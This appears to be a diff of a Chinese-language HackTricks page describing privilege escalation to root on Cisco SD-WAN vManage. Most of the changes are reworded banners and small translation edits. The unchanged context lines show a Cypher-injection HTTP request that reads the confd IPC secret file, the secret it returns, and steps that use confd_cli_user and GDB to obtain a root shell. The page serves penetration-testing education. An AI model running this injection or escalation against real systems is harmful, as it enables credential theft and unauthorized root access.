@@ -2,12 +2,12 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
-* 您在**网络安全公司**工作吗？ 您想看到您的**公司在HackTricks中做广告**吗？ 或者您想访问**PEASS的最新版本或下载HackTricks的PDF**吗？ 请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**吗？ 或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **在Twitter上** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**上关注**我。
 * **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
 
 </details>
@@ -22,7 +22,7 @@ vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-记得我们的Neo4j实例吗？它是在`vmanage`用户的权限下运行的，因此允许我们利用先前的漏洞检索文件：
+记得我们的Neo4j实例吗？它是在`vmanage`用户的权限下运行的，因此允许我们使用先前的漏洞检索文件：
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -34,7 +34,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-`confd_cli`程序不支持命令行参数，但会调用`/usr/bin/confd_cli_user`并传递参数。因此，我们可以直接调用`/usr/bin/confd_cli_user`并附上我们自己的参数。然而，由于我们当前的权限无法读取，所以我们需要从rootfs中检索并使用scp进行复制，读取帮助信息，然后使用它获取shell：
+`confd_cli`程序不支持命令行参数，但会调用`/usr/bin/confd_cli_user`并传递参数。因此，我们可以直接调用`/usr/bin/confd_cli_user`并附上我们自己的参数。然而，由于我们当前的权限无法读取，所以我们需要从rootfs中检索它并使用scp进行复制，读取帮助信息，然后使用它获取shell：
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -56,7 +56,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 (示例来自 [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-synacktiv团队的博客¹描述了一种优雅的方式来获得root shell，但缺点是需要获取 `/usr/bin/confd_cli_user` 的副本，而这个文件只有root用户可读。我找到了另一种无需这么麻烦就能升级到root权限的方法。
+synacktiv 团队的博客¹ 描述了一种优雅的方式来获取 root shell，但需要注意的是，这需要获取 `/usr/bin/confd_cli_user` 的副本，而该文件只能被 root 读取。我找到了另一种无需这么麻烦就能升级到 root 的方法。
 
 当我反汇编 `/usr/bin/confd_cli` 二进制文件时，我观察到以下内容：
 ```
@@ -96,7 +96,7 @@ root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/
 ```
 我假设“confd\_cli”程序将从已登录用户收集的用户ID和组ID传递给“cmdptywrapper”应用程序。
 
-我的第一次尝试是直接运行“cmdptywrapper”，并提供`-g 0 -u 0`，但失败了。似乎在某个地方创建了一个文件描述符（-i 1015），我无法伪造它。
+我的第一次尝试是直接运行“cmdptywrapper”，并提供`-g 0 -u 0`参数，但失败了。似乎在某个地方创建了一个文件描述符（-i 1015），我无法伪造它。
 
 如synacktiv的博客中所述（最后一个示例），`confd_cli`程序不支持命令行参数，但我可以通过调试器影响它，幸运的是系统中包含了GDB。
 
@@ -156,12 +156,12 @@ bash-4.4#
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
-* 你在**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**？或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 探索我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)。
-* 获取[**官方PEASS & HackTricks周边**](https://peass.creator-spring.com)。
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) **Discord群**](https://discord.gg/hRep4RUj7f) 或 **电报群**](https://t.me/peass) 或在**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**上关注我**。
+* 你在**网络安全公司**工作吗？想要看到你的**公司在HackTricks上被宣传**吗？或者想要获取**最新版本的PEASS或下载HackTricks的PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 * **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
 
 </details>
